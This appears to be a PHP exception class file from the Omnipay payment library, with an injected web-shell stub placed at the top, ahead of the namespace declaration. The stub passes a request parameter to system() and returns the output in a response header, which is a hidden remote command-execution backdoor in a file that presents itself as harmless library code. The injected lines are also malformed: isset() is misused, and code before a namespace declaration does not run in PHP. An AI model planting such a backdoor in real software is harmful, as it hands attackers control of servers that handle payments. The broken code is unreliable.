<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common\Exception;

/**
 * Bad Method Call Exception
 */
class BadMethodCallException extends \BadMethodCallException implements OmnipayException
{
}
